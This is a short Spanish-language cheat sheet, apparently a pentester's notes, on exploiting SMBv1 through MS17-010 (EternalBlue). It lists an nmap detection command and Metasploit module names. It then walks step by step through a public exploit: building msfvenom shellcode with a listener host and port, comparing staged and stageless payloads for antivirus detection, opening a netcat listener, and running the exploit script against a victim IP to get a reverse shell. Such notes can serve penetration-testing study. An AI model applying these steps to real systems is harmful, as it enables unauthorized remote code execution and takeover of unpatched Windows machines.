Ataca a SMBv1

# Scanner

## nmap
`nmap -sV -p445 --script=smb-vuln-ms17-010 <IP>`
## metasploit

module: **auxiliary/scanner/smb/smb_ms17_010**

# Exploit

## Manually

Usando el exploit https://github.com/3ndG4me/AutoBlue-MS17-01
1.- Clonamos el repositorio
2.- Nos metemos en el repositorio en el directorio shellcode y creamos el shell code que ejecutará la máquina, para ello ejecutamos el shell_prep.sh
	1.- Seleccionamos msfvenom para crear el payload
	2.- Ponemos el LHOST, el LPORT  que pide el script.
	3.- Elegimos si generar el payload como stage o stageless:
	
  Diferencias clave entre Staged y Stageless

| Característica                | **Staged (con etapas)**              | **Stageless (sin etapas)**               |
| ----------------------------- | ------------------------------------ | ---------------------------------------- |
| 🔹 **Ejecución**              | Se ejecuta en 2 fases                | Se ejecuta de una sola vez               |
| 🔹 **Tamaño del payload**     | Más pequeño (descarga la 2da etapa)  | Más grande (incluye todo)                |
| 🔹 **Dependencia de red**     | Necesita conexión para la 2da etapa  | No depende de red                        |
| 🔹 **Detección de Antivirus** | Más difícil de detectar (en memoria) | Más fácil de detectar (archivo completo) |

Esto generará dos binarios **sc_x64.bin** y **sc_x86.bin** y en función de la arquitectura de la máquina víctima se eligirá uno u otro.
3.- Nos ponemos en escucha con **netcat** `nc -nvlp 1234`
4.- En la raíz del repositorio, en función de la **versión** de windows de la máquina víctima, ejecutar uno de los scripts que hay: eternalblue_exploit7.py o 10 o 8...
	Para la version 7 o windows server 2008:
	`python eternalblue_exploit7.py <IP> shellcode/sc_x64.bin`
	
Listo tendremos una reverse_shell.
## Metasploit

Usar el módulo `exploit/windows/smb/ms17_010_eternalblue`
